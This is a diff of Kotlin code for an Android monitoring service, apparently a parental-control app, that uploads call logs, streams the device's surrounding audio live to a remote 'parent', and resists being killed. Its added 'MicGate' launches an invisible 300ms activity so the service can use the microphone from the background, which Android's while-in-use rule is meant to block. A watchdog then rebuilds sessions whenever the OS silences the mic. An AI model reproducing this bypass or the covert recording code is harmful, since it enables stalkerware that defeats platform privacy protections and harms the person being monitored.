@@ -1,5 +1,6 @@
 package com.example.background
 
+import android.Manifest
 import android.app.AlarmManager
 import android.app.Notification
 import android.app.NotificationChannel
@@ -8,15 +9,19 @@ import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
-import android.os.PowerManager
 import android.os.SystemClock
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
+import com.google.firebase.firestore.FieldValue
+import com.google.firebase.firestore.FirebaseFirestore
+import com.google.firebase.firestore.SetOptions
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -24,33 +29,42 @@ import kotlinx.coroutines.cancel
 import kotlinx.coroutines.launch
 
 /**
- * 🛡️ CareCircleForegroundService (Master Service — Option B Architecture + Native WebRTC)
+ * 🛡️ CareCircleForegroundService (Master Service — PATCHED v2)
  *
- * Replaces old WatchdogService + FlutterBackgroundService:
+ * Tumhare current code ka SAARA logic preserved hai (NativeDataCollector,
+ * CallDetectorService, FirestoreClient listener, contacts sync, device admin,
+ * WorkManager revival). Sirf ye fixes add hue:
  *
- * ARCHITECTURE PRINCIPLES:
- *  1. ✅ SINGLE FOREGROUND SERVICE — only one notification, one WakeLock
- *  2. ✅ NO ACCESSIBILITY DEPENDENCY — survives accessibility revocation
- *  3. ✅ CONTROLLED SYNC INTERVALS — Realme doesn't flag as "abnormal"
- *  4. ✅ WORKMANAGER-FRIENDLY — can be revived by WorkManager if killed
- *  5. ✅ INDEPENDENT — does its own work, doesn't depend on other services
- *  6. ✅ NATIVE WebRTC AUDIO — replaces Flutter WebRTC (24/7 stable)
+ * ⭐ FIX #1 (ROOT CAUSE — 30-60 min silent mic):
+ *   onCreate ke startForeground me mic type fail hone pe ab LOUD Log.e +
+ *   report (pehle chup-chaap SPECIAL_USE-only pe fall back ho jata tha —
+ *   background restart ke baad mic permanently blocked, kisi ko pata nahi).
  *
- * RESPONSIBILITIES:
- *  - Location updates (adaptive priority — battery-friendly)
- *  - Periodic heartbeat (3 min)
- *  - Realtime child_control listener (Firestore Snapshot Listener — 0 polling reads)
- *  - General data sync (30 min) — location + battery + device info + usage (NO contacts)
- *  - Contacts sync handling (triggered ONLY when parent explicitly requests)
- *  - Installed apps sync (24 hours)
- *  - Native WebRTC audio streaming (real-time)
- *  - WebRTC state restoration on service restart
- *  - Single persistent notification (dynamic text)
+ * ⭐ FIX #2 (MIC GATE): handleMicSync ab MicEligibility check karta hai.
+ *   App background me hai → MicGateActivity (300ms invisible) launch hoti
+ *   hai → "app in use" state restore → mic LEGAL. Foreground me hai →
+ *   direct start.
  *
- * NOT RESPONSIBLE FOR:
- *  - Service revival (handled by WorkManager + RestartReceiver)
- *  - App blocking (handled by AccessibilityWatchdogService — optional)
- *  - Notification capture (handled by CareCircleNotificationListener — independent)
+ * ⭐ FIX #3 (SILENCE WATCHDOG): har loop me check — WebRTC connected but
+ *   mic 10s se PURE ZEROS de raha hai = OS-blocked mic → auto-heal
+ *   (session rebuild with NEW call_id, max 3 attempts) → parent ko
+ *   mic_state report (jhoth "connected" nahi).
+ *
+ * ⭐ FIX #4 (BATTERY):
+ *   - Indefinite master WakeLock HATA DIYA (5-15%/day drain + Realme
+ *     "abnormal behavior" flag — tumhare AccessibilityWatchdogService v4
+ *     ne bhi yahi lesson seekha tha). Streaming ke dauran NativeWebRTCAudioSender
+ *     ka apna 2hr-cap wakelock kaafi hai. Firestore listener push-based hai.
+ *   - Main loop 10s → 60s (6x kam CPU wakeups; listener realtime hi hai)
+ *
+ * ⭐ FIX #6 (mic_state REPORTING): child_control doc me real status:
+ *   streaming / connecting / healing_n / blocked_silent / blocked_fgs_type /
+ *   blocked_no_permission / stopped — parent app UI me dikhao.
+ *
+ * NOT RESPONSIBLE FOR (unchanged):
+ *  - Service revival (WorkManager + RestartReceiver)
+ *  - App blocking (AccessibilityWatchdogService)
+ *  - Notification capture (CareCircleNotificationListener)
  */
 class CareCircleForegroundService : Service() {
 
@@ -59,15 +73,23 @@ class CareCircleForegroundService : Service() {
         private const val CHANNEL_ID = "carecircle_foreground_channel"
         private const val NOTIFICATION_ID = 1001
 
-        // 🔥 Sync intervals (Realme-friendly — not too aggressive)
-        private const val LOOP_INTERVAL_MS = 10_000L              // Main loop: 10s
-        private const val WAKELOCK_RENEW_INTERVAL_MS = 4 * 60_000L  // Renew WakeLock: 4 min
-        private const val HEARTBEAT_INTERVAL_MS = 3 * 60_000L     // Heartbeat: 3 min
-        private const val FULL_SYNC_INTERVAL_MS = 30 * 60_000L    // Full sync: 30 min (Screen Time, Device Info, Location ONLY)
-        private const val APPS_SYNC_INTERVAL_MS = 24 * 60 * 60_000L  // Installed apps: 24 hours (1 day)
+        // ⭐ FIX #4: 10s → 60s (battery). Snapshot listener realtime hai,
+        // loop sirf defensive checks + timed syncs ke liye hai.
+        private const val LOOP_INTERVAL_MS = 60_000L
+        private const val HEARTBEAT_INTERVAL_MS = 3 * 60_000L
+        private const val FULL_SYNC_INTERVAL_MS = 30 * 60_000L
+        private const val APPS_SYNC_INTERVAL_MS = 24 * 60 * 60_000L
+        private const val CALL_LOGS_SYNC_INTERVAL_MS = 30 * 60_000L
 
         private const val WAKE_LOCK_TAG = "CareCircle::MasterWakeLock"
         private const val PREFS_NAME = "carecircle_prefs"
+
+        // ⭐ FIX #3: silence watchdog limits
+        private const val MAX_MIC_HEAL_ATTEMPTS = 3
+
+        /** MicGateActivity ke liye service ka live reference */
+        @Volatile
+        var instanceRef: CareCircleForegroundService? = null
 
         /**
          * Start the master foreground service.
@@ -105,25 +127,30 @@ class CareCircleForegroundService : Service() {
 
     private val handler = Handler(Looper.getMainLooper())
     private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
-    private var wakeLock: PowerManager.WakeLock? = null
     private var lastHeartbeat = 0L
     private var lastFullSync = 0L
     private var lastAppsSync = 0L
+    private var lastCallLogsSync = 0L
     private var lastSyncRequestCheck = 0L
-    private var lastWakeLockRenew = 0L
 
     private lateinit var dataCollector: NativeDataCollector
 
-    // 🔥 NEW: Native WebRTC for audio streaming
+    // 🔥 Native WebRTC for audio streaming (single instance reused)
     private var nativeWebRTC: NativeWebRTCAudioSender? = null
     private var webrtcRunning = false
     private var webrtcCallId: String? = null
 
+    // ⭐ FIX #3: mic heal state
+    private var micHealAttempts = 0
+
     override fun onCreate() {
         super.onCreate()
+        instanceRef = this
         Log.d(TAG, "✅ CareCircleForegroundService created")
 
         // 🔥 CRITICAL: startForeground() within 5 sec of startForegroundService()
+        // ⭐ FIX #1: mic type fail ho to LOUD fail — silent fallback pe
+        // mic permanently blocked rehta tha aur kisi ko pata nahi chalta tha
         try {
             createNotificationChannel()
             val notification = buildNotification()
@@ -138,12 +165,27 @@ class CareCircleForegroundService : Service() {
                     )
                     Log.d(TAG, "✅ startForeground called (specialUse|microphone)")
                 } catch (e: Exception) {
-                    Log.w(TAG, "⚠️ startForeground with microphone failed, falling back: ${e.message}")
+                    // ⭐ FIX #1: Log.e + report — ye service ab MIC-ke-bina chal
+                    // rahi hai. Mic request aane pe MicGate isko heal karega.
+                    Log.e(TAG, "🚨 startForeground(MIC|SPECIAL_USE) FAILED on create: ${e.message} " +
+                            "— service SPECIAL_USE-only chal rahi hai, mic BLOCKED (MicGate se heal hoga)")
                     startForeground(
                         NOTIFICATION_ID,
                         notification,
                         ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                     )
+                }
+            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                try {
+                    startForeground(
+                        NOTIFICATION_ID,
+                        notification,
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    )
+                    Log.d(TAG, "✅ startForeground called (microphone)")
+                } catch (e: Exception) {
+                    Log.e(TAG, "🚨 startForeground(MIC) failed: ${e.message} — mic BLOCKED (MicGate se heal hoga)")
+                    startForeground(NOTIFICATION_ID, notification)
                 }
             } else {
                 startForeground(NOTIFICATION_ID, notification)
@@ -169,12 +211,13 @@ class CareCircleForegroundService : Service() {
             Log.e(TAG, "❌ Data collector init failed: ${e.message}")
         }
 
-        // 🔥 Indefinite WakeLock (single, renewed every 4 min)
-        try {
-            acquireWakeLock()
-        } catch (e: Exception) {
-            Log.e(TAG, "WakeLock failed: ${e.message}")
-        }
+        // ⭐ FIX #4: Indefinite WakeLock HATA DIYA.
+        //   - 24/7 partial wakelock = 5-15%/day extra battery drain
+        //   - OEM "abnormal behavior" detection trigger karta hai
+        //     (tumhare AccessibilityWatchdogService v4 ne bhi yahi seekha tha)
+        //   - Firestore listener push-based hai — wakelock ki zaroorat nahi
+        //   - Streaming ke dauran NativeWebRTCAudioSender ka apna
+        //     2hr-cap call wakelock CPU awake rakhta hai
 
         // 🔥 Start call detection automatically (AirDroid style)
         try {
@@ -200,8 +243,7 @@ class CareCircleForegroundService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.d(TAG, "onStartCommand")
-        // START_STICKY: System will restart service if killed
+        Log.d(TAG, "onStartCommand source=${intent?.getStringExtra("source") ?: "restart/sticky"}")
         return START_STICKY
     }
 
@@ -217,13 +259,24 @@ class CareCircleForegroundService : Service() {
             )
             val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
             try {
-                alarmManager.setAndAllowWhileIdle(
-                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                    SystemClock.elapsedRealtime() + 2000,  // 2 sec delay
-                    pendingIntent
-                )
+                // ⭐ Exact alarm jab allowed (SCHEDULE_EXACT_ALARM granted hai)
+                val canExact = Build.VERSION.SDK_INT < Build.VERSION_CODES.S ||
+                        alarmManager.canScheduleExactAlarms()
+                if (canExact) {
+                    alarmManager.setExactAndAllowWhileIdle(
+                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                        SystemClock.elapsedRealtime() + 2000,
+                        pendingIntent
+                    )
+                } else {
+                    alarmManager.setAndAllowWhileIdle(
+                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                        SystemClock.elapsedRealtime() + 2000,
+                        pendingIntent
+                    )
+                }
             } catch (se: SecurityException) {
-                Log.w(TAG, "setAndAllowWhileIdle failed: ${se.message}")
+                Log.w(TAG, "exact alarm failed: ${se.message}")
                 alarmManager.set(
                     AlarmManager.ELAPSED_REALTIME_WAKEUP,
                     SystemClock.elapsedRealtime() + 2000,
@@ -242,7 +295,6 @@ class CareCircleForegroundService : Service() {
         Log.w(TAG, "❌ Service destroyed")
         handler.removeCallbacks(mainLoop)
         serviceScope.cancel()
-        releaseWakeLock()
 
         try {
             controlListenerRegistration?.remove()
@@ -259,7 +311,7 @@ class CareCircleForegroundService : Service() {
             Log.e(TAG, "Failed to stop CallDetectorService: ${e.message}")
         }
 
-        // 🔥 NEW: Stop WebRTC on service destroy
+        // 🔥 Stop WebRTC on service destroy
         try {
             nativeWebRTC?.stop()
             nativeWebRTC = null
@@ -268,6 +320,7 @@ class CareCircleForegroundService : Service() {
             Log.e(TAG, "WebRTC cleanup failed: ${e.message}")
         }
 
+        instanceRef = null
         super.onDestroy()
     }
 
@@ -281,12 +334,6 @@ class CareCircleForegroundService : Service() {
 
                 // 🔥 Ensure Realtime Snapshot Listener is attached (0 polling reads!)
                 ensureChildControlListener()
-
-                // 🔥 WakeLock renewal (defensive — system may have released)
-                if (now - lastWakeLockRenew >= WAKELOCK_RENEW_INTERVAL_MS) {
-                    renewWakeLock()
-                    lastWakeLockRenew = now
-                }
 
                 // 📊 DATA COLLECTION — all on IO dispatcher (no ANR)
                 if (::dataCollector.isInitialized) {
@@ -315,7 +362,7 @@ class CareCircleForegroundService : Service() {
                         lastFullSync = now
                     }
 
-                    // 3. Installed apps sync (6 hours)
+                    // 3. Installed apps sync (24 hours)
                     if (now - lastAppsSync >= APPS_SYNC_INTERVAL_MS) {
                         serviceScope.launch {
                             try {
@@ -326,7 +373,22 @@ class CareCircleForegroundService : Service() {
                         }
                         lastAppsSync = now
                     }
+
+                    // 4. Call logs sync (30 min — past 7 days + auto-clean old logs)
+                    if (now - lastCallLogsSync >= CALL_LOGS_SYNC_INTERVAL_MS) {
+                        serviceScope.launch {
+                            try {
+                                CallLogsSyncHelper(applicationContext).syncCallLogs(days = 7)
+                            } catch (e: Exception) {
+                                Log.e(TAG, "Periodic CallLogsSync: ${e.message}")
+                            }
+                        }
+                        lastCallLogsSync = now
+                    }
                 }
+
+                // ⭐ FIX #3: silence watchdog — blocked mic detect + auto-heal
+                checkMicSilence()
 
             } catch (e: Exception) {
                 Log.e(TAG, "Main loop error: ${e.message}")
@@ -362,24 +424,46 @@ class CareCircleForegroundService : Service() {
 
     /**
      * 🔥 Realtime handler for child_control document updates from Firestore.
-     * Separates general sync (Screen time, Device Info, Location) from Contacts sync.
+     * Separates general sync (Screen time, Device Info, Location) from Contacts and Call Logs sync.
      */
     private fun handleChildControlChange(data: Map<String, Any?>) {
         val syncRequested = data["sync_request"] as? Boolean ?: false
         val contactsSyncRequested = data["contacts_sync_request"] as? Boolean ?: false
+        val callLogsSyncRequested = data["call_logs_sync_request"] as? Boolean ?: false
         val syncMic = data["sync_mic"] as? Boolean ?: false
         val callId = data["call_id"] as? String
 
-        // 1. General Sync: Screen Time, Device Info & Location ONLY
+        // 1. General Sync: Screen Time, Device Info, Location & Call Logs
         if (syncRequested) {
-            Log.d(TAG, "📡 Parent sync requested — collecting Screen Time, Device Info & Location ONLY")
+            Log.d(TAG, "📡 Parent sync requested — collecting Screen Time, Device Info, Location & Call Logs")
             serviceScope.launch {
                 try {
                     dataCollector.collectAndSyncAll()
+                    CallLogsSyncHelper(applicationContext).syncCallLogs(days = 7)
                 } catch (e: Exception) {
                     Log.e(TAG, "General sync failed: ${e.message}")
                 } finally {
                     FirestoreClient.updateSyncComplete()
+                }
+            }
+        }
+
+        // 2. Call Logs Sync specifically requested
+        if (callLogsSyncRequested) {
+            Log.d(TAG, "📡 Call logs sync requested by parent — syncing Call Logs")
+            serviceScope.launch {
+                try {
+                    CallLogsSyncHelper(applicationContext).syncCallLogs(days = 7)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Call logs sync failed: ${e.message}")
+                } finally {
+                    try {
+                        val current = currentUid()
+                        if (current != null) {
+                            FirebaseFirestore.getInstance().collection("child_control").document(current)
+                                .update("call_logs_sync_request", FieldValue.delete())
+                        }
+                    } catch (_: Exception) {}
                 }
             }
         }
@@ -403,67 +487,165 @@ class CareCircleForegroundService : Service() {
     }
 
     /**
-     * 🔥 Handle audio listening (sync_mic)
+     * 🔥 Handle audio listening (sync_mic) — ⭐ FIX #2: MIC GATE ADDED
+     *
+     * Pehle: seedha nativeWebRTC.start() — background restart ke baad
+     * Android 11+ while-in-use rule mic SILENTLY block kar deta tha
+     * (AudioRecord chalta tha but zeros deta tha).
      */
     private fun handleMicSync(syncMic: Boolean, callId: String?) {
         if (syncMic && !callId.isNullOrEmpty()) {
             if (webrtcCallId != callId || !webrtcRunning) {
                 Log.d(TAG, "🎤 Audio requested for call $callId (previous: $webrtcCallId)")
 
-                if (webrtcRunning) {
-                    Log.d(TAG, "🔄 Call ID changed — stopping old WebRTC session")
-                    try {
-                        nativeWebRTC?.stop()
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Old WebRTC stop failed: ${e.message}")
-                    }
+                // ⭐ CHECK 0: RECORD_AUDIO permission (user revoke to nahi kiya)
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
+                    != PackageManager.PERMISSION_GRANTED
+                ) {
+                    Log.e(TAG, "🚨 RECORD_AUDIO permission denied — blocked_no_permission report")
+                    reportMicState("blocked_no_permission")
+                    return
                 }
 
-                // 🔥 Update notification FIRST to ensure MICROPHONE foreground service type is active
-                updateNotification(
-                    "CareCircle Listening Active",
-                    "Parent is listening to surroundings"
-                )
-
-                try {
-                    if (nativeWebRTC == null) {
-                        nativeWebRTC = NativeWebRTCAudioSender(applicationContext)
-                    }
-                    nativeWebRTC?.start(callId)
-                    webrtcRunning = true
-                    webrtcCallId = callId
-
-                    getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-                        .edit()
-                        .putBoolean("webrtc_running", true)
-                        .putString("webrtc_call_id", callId)
-                        .apply()
-                } catch (e: Exception) {
-                    Log.e(TAG, "❌ WebRTC start failed: ${e.message}")
-                    webrtcRunning = false
-                    webrtcCallId = null
+                // ⭐ CHECK 1: Mic eligibility (while-in-use rule)
+                if (MicEligibility.isAppInUse()) {
+                    // App foreground/in-use — direct start 100% legal
+                    startAudioSessionNow(callId)
+                } else {
+                    // App background — MicGate launch karo (while-in-use restore)
+                    launchMicGate(callId)
                 }
             }
         } else if (!syncMic && webrtcRunning) {
-            Log.d(TAG, "🛑 Stopping audio listening")
+            stopAudioSession()
+        }
+    }
+
+    /**
+     * ⭐ FIX #2: MicGate launch — 300ms invisible activity se
+     * "app in use" state restore karke mic legal banate hai.
+     */
+    private fun launchMicGate(callId: String) {
+        Log.i(TAG, "🎤 Background mic request — MicGate launch (callId=$callId)")
+        MicGateActivity.serviceRef = this
+        MicGateActivity.pendingCallId = callId
+
+        try {
+            val intent = Intent(this, MicGateActivity::class.java).apply {
+                addFlags(
+                    Intent.FLAG_ACTIVITY_NEW_TASK or
+                            Intent.FLAG_ACTIVITY_NO_USER_ACTION or
+                            Intent.FLAG_ACTIVITY_NO_ANIMATION
+                )
+            }
+            startActivity(intent)
+            // Gate ke onResume se startAudioSessionNow(callId) aayega
+        } catch (e: Exception) {
+            // Background activity launch blocked (overlay permission nahi hai
+            // ya OEM ne block kiya). Fallback: direct start try karte hai.
+            Log.e(TAG, "MicGate launch blocked: ${e.message} — direct start try karte hai")
+            startAudioSessionNow(callId)
+        }
+    }
+
+    /**
+     * ⭐ PUBLIC — MicGateActivity aur handleMicSync dono yahi call karte hai.
+     * Tumhara original start logic + FGS mic-type re-assert.
+     */
+    fun startAudioSessionNow(callId: String) {
+        Log.i(TAG, "🎤 startAudioSessionNow callId=$callId appInUse=${MicEligibility.isAppInUse()}")
+
+        // ⭐ Re-assert FGS WITH microphone type — background restart ke baad
+        // yahi silently missing hota tha (FIX #1). App "in use" hai ab
+        // (direct ya MicGate se), isliye ye grant ho jana chahiye.
+        assertForegroundWithMicType()
+
+        if (webrtcRunning) {
+            Log.d(TAG, "🔄 Call ID changed — stopping old WebRTC session")
             try {
                 nativeWebRTC?.stop()
-                webrtcRunning = false
-                webrtcCallId = null
-
-                getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-                    .edit()
-                    .putBoolean("webrtc_running", false)
-                    .remove("webrtc_call_id")
-                    .apply()
-
-                updateNotification(
-                    "CareCircle Protection Active",
-                    "Monitoring is running"
-                )
             } catch (e: Exception) {
-                Log.e(TAG, "❌ WebRTC stop failed: ${e.message}")
+                Log.e(TAG, "Old WebRTC stop failed: ${e.message}")
             }
+            webrtcRunning = false
+        }
+
+        // 🔥 Update notification (text-only via notify() — FGS type safe)
+        updateNotification(
+            "CareCircle Listening Active",
+            "Parent is listening to surroundings"
+        )
+
+        try {
+            if (nativeWebRTC == null) {
+                nativeWebRTC = NativeWebRTCAudioSender(applicationContext)
+            }
+            nativeWebRTC?.start(callId)
+            webrtcRunning = true
+            webrtcCallId = callId
+            micHealAttempts = 0 // fresh session — heal counter reset
+
+            getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+                .edit()
+                .putBoolean("webrtc_running", true)
+                .putString("webrtc_call_id", callId)
+                .apply()
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ WebRTC start failed: ${e.message}")
+            webrtcRunning = false
+            webrtcCallId = null
+            reportMicState("start_failed")
+        }
+    }
+
+    /**
+     * ⭐ Extracted stop logic (handleMicSync stop branch + watchdog dono use karte hai)
+     */
+    private fun stopAudioSession() {
+        Log.d(TAG, "🛑 Stopping audio listening")
+        try {
+            nativeWebRTC?.stop()
+            webrtcRunning = false
+            webrtcCallId = null
+            micHealAttempts = 0
+
+            getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+                .edit()
+                .putBoolean("webrtc_running", false)
+                .remove("webrtc_call_id")
+                .apply()
+
+            updateNotification(
+                "CareCircle Protection Active",
+                "Monitoring is running"
+            )
+            reportMicState("stopped")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ WebRTC stop failed: ${e.message}")
+        }
+    }
+
+    /**
+     * ⭐ FIX #1: FGS re-assert WITH microphone type. Fail ho to LOUD log
+     * (koi silent fallback nahi). Return: mic type granted ya nahi.
+     */
+    private fun assertForegroundWithMicType(): Boolean {
+        return try {
+            val notification = buildNotification()
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(
+                    NOTIFICATION_ID,
+                    notification,
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
+                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                )
+            } else {
+                startForeground(NOTIFICATION_ID, notification)
+            }
+            true
+        } catch (e: Exception) {
+            Log.e(TAG, "🚨 assertForegroundWithMicType FAILED: ${e.message} — mic grant nahi hua")
+            false
         }
     }
 
@@ -486,8 +668,94 @@ class CareCircleForegroundService : Service() {
         }
     }
 
+    // ============ ⭐ FIX #3: SILENCE WATCHDOG ============
+
     /**
-     * 🔥 NEW: Update notification text dynamically
+     * Har loop (60s) me check: WebRTC connected hai but mic 10s+ se
+     * PURE ZEROS de raha hai? = OS ne mic block kiya (while-in-use
+     * violation ya concurrent capture theft). Auto-heal:
+     *   1. Session rebuild with NEW call_id ("xxx-h1", "xxx-h2"...)
+     *   2. child_control doc me call_id update — parent naya offer bhejega
+     *   3. Max 3 attempts → phir blocked_silent report (jhoth nahi)
+     */
+    private fun checkMicSilence() {
+        val sender = nativeWebRTC ?: return
+        if (!webrtcRunning || webrtcCallId == null) return
+        if (!sender.isWatchdogSuspect()) return
+
+        Log.e(TAG, "🚨 WATCHDOG: WebRTC alive but mic SILENT (zeros) — heal attempt ${micHealAttempts + 1}/$MAX_MIC_HEAL_ATTEMPTS")
+
+        if (micHealAttempts < MAX_MIC_HEAL_ATTEMPTS) {
+            micHealAttempts++
+            reportMicState("healing_$micHealAttempts")
+
+            try { sender.stop() } catch (_: Exception) {}
+            webrtcRunning = false
+
+            // NAYA call_id — fresh calls/ doc (purane doc me answer already
+            // posted hai, wahi reuse karne se parent ka SDP stale ho jata).
+            // Parent call_id change dekh ke apna session refresh karega.
+            val newCallId = "${webrtcCallId}-h$micHealAttempts"
+            currentUid()?.let { uid ->
+                try {
+                    FirebaseFirestore.getInstance()
+                        .collection("child_control").document(uid)
+                        .update("call_id", newCallId)
+                } catch (e: Exception) {
+                    Log.e(TAG, "call_id update failed: ${e.message}")
+                }
+            }
+
+            val targetCallId = newCallId
+            handler.postDelayed({
+                if (instanceRef != null) startAudioSessionNow(targetCallId)
+            }, 1500)
+        } else {
+            // Heal limit khatam — jhoth "Listening" mat dikhao
+            Log.e(TAG, "🚨 Heal limit reached — mic_state=blocked_silent report")
+            reportMicState("blocked_silent")
+            stopAudioSession()
+            updateNotification(
+                "CareCircle Mic Blocked",
+                "Child device se app ek baar kholna padega"
+            )
+        }
+    }
+
+    // ============ ⭐ FIX #6: MIC STATE REPORTING ============
+
+    /** child_control doc me real mic status merge karo (parent UI ke liye) */
+    private fun reportMicState(state: String) {
+        val uid = currentUid() ?: return
+        try {
+            FirebaseFirestore.getInstance()
+                .collection("child_control").document(uid)
+                .set(
+                    mapOf(
+                        "mic_state" to state,
+                        "mic_state_time" to FieldValue.serverTimestamp(),
+                        "active_call_id" to webrtcCallId
+                    ),
+                    SetOptions.merge()
+                )
+            Log.d(TAG, "📊 mic_state = $state")
+        } catch (e: Exception) {
+            Log.e(TAG, "mic_state report failed: ${e.message}")
+        }
+    }
+
+    private fun currentUid(): String? {
+        return try {
+            FirestoreClient.getUserId()
+                ?: getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+                    .getString("currentUserId", null)
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    /**
+     * 🔥 Update notification text dynamically
      */
     private fun updateNotification(title: String, content: String) {
         try {
@@ -501,20 +769,14 @@ class CareCircleForegroundService : Service() {
                 .setShowWhen(false)
                 .build()
 
-            // 🔥 CRITICAL: Update foreground service type to include MICROPHONE when audio is active
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                val serviceType = if (title.contains("Listening")) {
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
-                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-                } else {
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
-                }
-                startForeground(NOTIFICATION_ID, notification, serviceType)
-            } else {
-                startForeground(NOTIFICATION_ID, notification)
-            }
+            // 🔥 Use NotificationManager.notify() to update the notification text/UI.
+            // NEVER call startForeground() here without MICROPHONE type —
+            // (startForeground re-assert sirf assertForegroundWithMicType() me
+            // hota hai jo HAMESHA mic type ke saath call karta hai)
+            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            manager.notify(NOTIFICATION_ID, notification)
 
-            Log.d(TAG, "✅ Notification + service type updated (audio=${title.contains("Listening")})")
+            Log.d(TAG, "✅ Notification text updated: $title")
         } catch (e: Exception) {
             Log.e(TAG, "Notification update failed: ${e.message}")
         }
@@ -547,39 +809,6 @@ class CareCircleForegroundService : Service() {
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(channel)
-        }
-    }
-
-    // ============ WakeLock Management ============
-
-    private fun acquireWakeLock() {
-        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, WAKE_LOCK_TAG)
-        wakeLock?.setReferenceCounted(false)
-        wakeLock?.acquire()  // 🔥 Indefinite
-        Log.d(TAG, "✅ WakeLock acquired (indefinite)")
-    }
-
-    private fun renewWakeLock() {
-        try {
-            wakeLock?.let { wl ->
-                if (!wl.isHeld) {
-                    wl.acquire()
-                    Log.d(TAG, "🔄 WakeLock re-acquired")
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "WakeLock renew failed: ${e.message}")
-        }
-    }
-
-    private fun releaseWakeLock() {
-        try {
-            wakeLock?.let {
-                if (it.isHeld) it.release()
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "WakeLock release failed: ${e.message}")
         }
     }
 }
